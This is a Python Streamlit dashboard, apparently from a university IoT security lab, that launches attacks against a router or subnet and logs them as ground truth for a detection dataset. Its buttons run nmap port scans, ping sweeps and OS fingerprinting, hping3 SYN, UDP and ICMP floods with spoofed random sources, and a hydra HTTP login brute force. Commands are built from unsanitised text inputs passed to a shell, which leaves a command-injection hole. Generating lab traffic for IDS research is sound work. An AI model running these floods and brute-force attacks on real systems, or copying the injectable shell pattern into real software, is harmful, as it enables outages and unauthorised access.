import streamlit as st
import subprocess
import time
import json
from datetime import datetime

# --- CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(page_title="Attack Framework - ISEP", layout="wide")
st.title("🛡️ Dashboard de Injeção de Ataques IoT")
st.sidebar.header("Configurações de Rede")

target_ip = st.sidebar.text_input("IP do Alvo (Router)", value="192.168.1.1")
interface = st.sidebar.text_input("Interface de Injeção", value="eth1")
target_subnet = st.sidebar.text_input("Target Subnet", value="192.168.1.0/24")

# --- FUNÇÃO PARA LOGGING (GROUND TRUTH) ---
def log_attack(attack_type, variant, start_time, end_time, status="SUCCESS"):
    entry = {
        "timestamp_start": start_time,
        "timestamp_end": end_time,
        "attack": attack_type,
        "variant": variant,
        "target": target_ip,
        "status": status
    }
    with open("attack_log.json", "a") as f:
        f.write(json.dumps(entry) + "\n")

# --- FUNÇÃO PARA EXECUTAR COMANDOS ---
def run_command(cmd, attack_type, variant):
    start = datetime.now().isoformat()
    with st.spinner(f"Executando {variant}..."):
        try:
            # Executa o comando e espera terminar
            process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            end = datetime.now().isoformat()
            log_attack(attack_type, variant, start, end)
            st.success(f"Ataque {variant} concluído!")
            st.code(process.stdout)
        except Exception as e:
            st.error(f"Erro: {e}")

# --- TABS PARA CADA CATEGORIA ---
tab1, tab2, tab3, tab4 = st.tabs(["Scanning Vertical", "Scanning Horizontal", "DDoS/Flood", "Brute Force"])

with tab1:
    st.header("Varrimento Vertical (Router)")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: SYN Scan"):
        run_command(f"sudo nmap -e {interface} -sS -p 1-1024 {target_ip}", "Port Scan", "SYN-Vertical")
    if col2.button("V2: Connect Scan"):
        run_command(f"sudo nmap -e {interface} -sT -p 1-1024 {target_ip}", "Port Scan", "Connect-Vertical")
    if col3.button("V3: UDP Scan"):
        run_command(f"sudo nmap -e {interface} -sU -p 53,161,1900 {target_ip}", "Port Scan", "UDP-Vertical")

with tab2:
    st.header("Varrimento Horizontal (LAN)")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: Ping Sweep"):
        run_command(f"sudo nmap -e {interface} -sn {target_subnet}", "Network Scan", "Ping-Sweep")
    if col2.button("V2: Web Sweep"):
        run_command(f"sudo nmap -e {interface} -sS -p 80,443 {target_subnet}", "Network Scan", "Web-Discovery")
    if col3.button("V3: OS Fingerprinting"):
        run_command(f"sudo nmap -e {interface} -O {target_subnet}", "Network Scan", "OS Fingerprinting")    

with tab3:
    st.header("DDoS Volumétrico")
    col1, col2, col3 = st.columns(3)
    st.warning("Atenção: Estes ataques correm por 15 segundos.")
    if col1.button("V1: SYN Flood"):
        run_command(f"sudo timeout 15 hping3 -S --flood -V -p 80 --rand-source -I {interface} {target_ip}", "DDoS", "SYN-Flood")
    if col2.button("V2: UDP Flood"):
        run_command(f"sudo timeout 15 hping3 --udp --flood -V -p 53 --rand-source -I {interface} {target_ip}", "DDoS", "UDP-Flood")
    if col3.button("V3: ICMP Flood"):
        run_command(f"sudo timeout 15 hping3 -1 --flood -V --rand-source -I {interface} {target_ip}", "DDoS", "ICMP Flood")  

with tab4:
    st.header("Acesso (Brute Force)")
    if st.button("V1: HTTP Brute Force"):
        run_command(f"hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 {target_ip} http-get /:F=failed", "Brute Force", "HTTP-Login")

st.divider()
st.subheader("📜 Logs de Ground Truth (Mais recentes primeiro)")

try:
    with open("attack_log.json", "r") as f:
        # Lê todas as linhas do ficheiro
        logs = f.readlines()
        
        # Inverte a ordem das linhas (os últimos passam para primeiro)
        logs_invertidos = reversed(logs)
        
        # Mostra os últimos ataques já na ordem correta
        for log in logs_invertidos:
            st.json(json.loads(log))
except FileNotFoundError:
    st.write("Ainda não existem logs de ataques.")
